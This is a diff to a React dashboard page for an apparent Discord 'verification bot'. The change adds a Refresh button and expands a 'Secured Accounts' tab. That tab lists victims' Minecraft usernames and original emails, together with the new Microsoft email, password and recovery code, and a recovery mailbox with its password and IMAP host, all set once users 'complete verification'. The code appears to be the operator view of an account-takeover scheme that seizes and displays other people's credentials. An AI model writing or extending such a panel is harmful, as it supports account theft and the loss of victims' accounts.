@@ -711,6 +711,20 @@ function VerificationBotPage() {
           {/* Secured Accounts Tab */}
           {activeTab === "accounts" && (
             <div className="space-y-6 animate-tab-enter">
+              <div className="flex justify-end">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setLoading(true);
+                    fetchSecuredAccounts()
+                      .then((accts) => setSecuredAccounts(accts as Array<Record<string, unknown>>))
+                      .finally(() => setLoading(false));
+                  }}
+                  className="rounded-full brutal-border px-3 py-1.5 text-[11px] font-semibold hover:bg-secondary/40"
+                >
+                  Refresh
+                </button>
+              </div>
               {securedAccounts.length > 0 ? (
                 <div className="rounded-2xl brutal-border bg-card">
                   <div className="p-5 border-b border-border/60 flex items-center gap-3 bg-secondary/15">
@@ -718,42 +732,79 @@ function VerificationBotPage() {
                     <div>
                       <h3 className="font-semibold text-sm">Secured Accounts</h3>
                       <p className="text-xs text-muted-foreground">
-                        Credentials for accounts secured via your bot. Only shown here in the dashboard.
+                        Full credentials + recovery mailbox. Only shown here (not in Discord).
                       </p>
                     </div>
                   </div>
                   <div className="divide-y divide-border/40">
-                    {(securedAccounts as Array<Record<string, string>>).map((acc) => (
+                    {(securedAccounts as Array<Record<string, string>>).map((acc) => {
+                      const mailbox =
+                        acc.mailbox_email ||
+                        (acc.new_email && !String(acc.new_email).includes("Couldn")
+                          ? acc.new_email
+                          : "");
+                      return (
                       <div key={acc.id} className="p-4 text-xs space-y-2">
-                        <div className="flex items-center justify-between">
+                        <div className="flex items-center justify-between gap-2 flex-wrap">
                           <span className="font-semibold text-primary">
                             {acc.mc_username}
                           </span>
                           <span className="text-muted-foreground">
-                            {new Date(acc.secured_at).toLocaleString()}
+                            {acc.secured_at
+                              ? new Date(acc.secured_at).toLocaleString()
+                              : ""}
                           </span>
                         </div>
+                        {acc.mc_email ? (
+                          <p className="text-[11px] text-muted-foreground">
+                            Original: <code className="text-foreground/80">{acc.mc_email}</code>
+                          </p>
+                        ) : null}
                         <div className="grid sm:grid-cols-2 gap-2">
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">New Email</span>
-                            <code className="block text-foreground break-all">{acc.new_email}</code>
+                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">New Email (MS)</span>
+                            <code className="block text-foreground break-all">{acc.new_email || "—"}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Password</span>
-                            <code className="block text-foreground">{acc.new_password}</code>
+                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">MS Password</span>
+                            <code className="block text-foreground break-all">{acc.new_password || "—"}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                             <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Recovery Code</span>
-                            <code className="block text-foreground">{acc.new_recovery_code}</code>
+                            <code className="block text-foreground break-all">{acc.new_recovery_code || "—"}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                             <span className="text-[10px] text-muted-foreground uppercase tracking-widest">MC Method</span>
-                            <code className="block text-foreground">{acc.mc_method}</code>
+                            <code className="block text-foreground">{acc.mc_method || "—"}</code>
+                          </div>
+                          <div className="rounded-lg bg-primary/5 border border-primary/20 p-2.5 space-y-1 sm:col-span-2">
+                            <span className="text-[10px] text-primary uppercase tracking-widest font-semibold">
+                              Recovery mailbox
+                              {acc.mailbox_provider ? ` · ${acc.mailbox_provider}` : ""}
+                            </span>
+                            <code className="block text-foreground break-all">
+                              {mailbox || "—"}
+                            </code>
+                            {acc.mailbox_password ? (
+                              <div className="pt-1 space-y-0.5">
+                                <span className="text-[10px] text-muted-foreground uppercase tracking-widest">
+                                  Mailbox password
+                                </span>
+                                <code className="block text-foreground break-all">
+                                  {acc.mailbox_password}
+                                </code>
+                              </div>
+                            ) : null}
+                            {acc.mailbox_imap_host ? (
+                              <p className="text-[10px] text-muted-foreground pt-0.5">
+                                IMAP: {acc.mailbox_imap_host}
+                              </p>
+                            ) : null}
                           </div>
                         </div>
-
                       </div>
-                    ))}
+                      );
+                    })}
                   </div>
                 </div>
               ) : (
@@ -761,7 +812,7 @@ function VerificationBotPage() {
                   <ShieldCheck className="h-10 w-10 text-muted-foreground mx-auto mb-3" />
                   <p className="text-sm text-muted-foreground">No secured accounts yet.</p>
                   <p className="text-xs text-muted-foreground/60 mt-1">
-                    Accounts will appear here after users complete verification.
+                    Accounts appear here after secure completes (email, password, recovery code, mailbox).
                   </p>
                 </div>
               )}
